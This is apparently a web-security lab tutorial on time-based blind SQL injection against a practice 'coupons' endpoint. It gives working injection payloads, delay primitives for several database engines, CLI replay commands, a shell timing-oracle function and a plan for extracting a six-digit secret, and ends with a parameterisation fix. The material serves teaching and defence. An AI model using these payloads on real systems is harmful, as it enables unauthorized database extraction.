# Lab 14 — Coupons

## When there is no bit to read

Lab 13 had one boolean. This endpoint returns the same 24 bytes no matter what
you inject — no error, no length change, no status change. The response carries
no information about the query at all.

Except one thing: **how long the server took to produce it.** Time is a side
channel that exists whether or not anybody designed an output.

## The payload shape

```sql
zz' OR (SELECT CASE WHEN (<predicate>) THEN sleep(0.4) ELSE 0 END
        FROM staff WHERE name='admin') --
```

`CASE WHEN` is the portable conditional; put the delay in the true branch and
zero in the false one. Then measure.

| Engine | The delay primitive |
| --- | --- |
| MySQL | `SLEEP(1)`, or `BENCHMARK(5000000, SHA1('x'))` where `SLEEP` is blocked |
| PostgreSQL | `pg_sleep(1)`; `; SELECT pg_sleep(1)` with stacked queries |
| MSSQL | `WAITFOR DELAY '0:0:1'` |
| Oracle | `dbms_pipe.receive_message('a',1)` |
| SQLite | none — hence this lab registers one, as an app can |

Where no primitive exists, manufacture cost: a heavy cartesian join, a
`RLIKE` with catastrophic backtracking, or a large `REPEAT()`.

## Measure with `total_ms`, not with `time`

`h5i websec replay` reports the clock for you:

```bash
h5i websec replay req_0 --session lab14 --reset-budget --set "query.code=…" |
  python3 -c 'import json,sys;print(json.load(sys.stdin)["samples"][0]["total_ms"])'
```

That figure is measured inside the engine around the send. Wrapping the CLI in
`time` measures process startup as well — tens of milliseconds of noise on a
signal you are trying to read at a few hundred.

For a calibration run, use `--repeat`:

```bash
h5i websec replay req_0 --session lab14 --repeat 5 --set "query.code=zz' OR (SELECT sleep(0.4)) -- "
```

The reply carries every sample plus a **median** and a **median absolute
deviation** — the pair that survives one scheduling hiccup where a mean does
not. Set your threshold from the gap between the two medians (true and false),
not from a single reading.

## Timing oracles lie in one direction

Noise can only make a fast response look slow. It cannot make a sleeping server
answer early. So the asymmetric rule:

> **Trust every "fast". Confirm every "slow".**

```bash
truth() {
  [ "$(ms "$1")" -lt $THRESHOLD ] && return 1   # fast → definitely false
  [ "$(ms "$1")" -lt $THRESHOLD ] && return 1   # confirm the slow reading
  return 0
}
```

The confirmation is nearly free because the answer it confirms is the *fast*
one. This is not a workaround for h5i specifically — it is how you write any
timing oracle that has to run over a network you do not control.

## Cost

Six digits, binary-searched over `0`–`9`: 4 predicates each, 24 requests, plus
confirmations. At 0.4 s per positive that is under fifteen seconds. Search the
digit range (`48..57`), not the whole ASCII range — knowing the alphabet of the
secret is worth three requests per character.

## The fix

Parameterise. And note again what does *not* fix it: this application already
returns a constant body, already hides its errors, and is still fully
extractable. Statement timeouts and query cost limits reduce the bandwidth of
the channel; they do not close it.

## h5i technique

`samples[].total_ms`, `--repeat N` with its median and MAD, and the confirm-the-
slow-reading discipline.
